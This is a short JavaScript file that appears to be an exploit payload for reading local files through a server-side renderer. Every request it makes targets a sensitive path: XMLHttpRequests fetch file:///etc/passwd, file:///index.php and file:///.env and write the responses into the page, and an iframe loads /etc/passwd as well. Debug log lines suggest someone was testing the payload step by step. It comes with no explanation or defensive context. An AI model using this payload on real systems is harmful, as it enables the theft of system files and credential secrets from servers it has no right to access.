console.log("file called");

console.log("welcome");
console.log("another updated");
// request
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
console.log("trying to read file");
console.log(x.send());

x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
console.log("trying to read file");
x.open("GET","file:///index.php");
console.log("trying to read file");
console.log(x.send());

x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///.env");
console.log(x.send());
document.write('<iframe src=file:///etc/passwd></iframe>');

// udpated
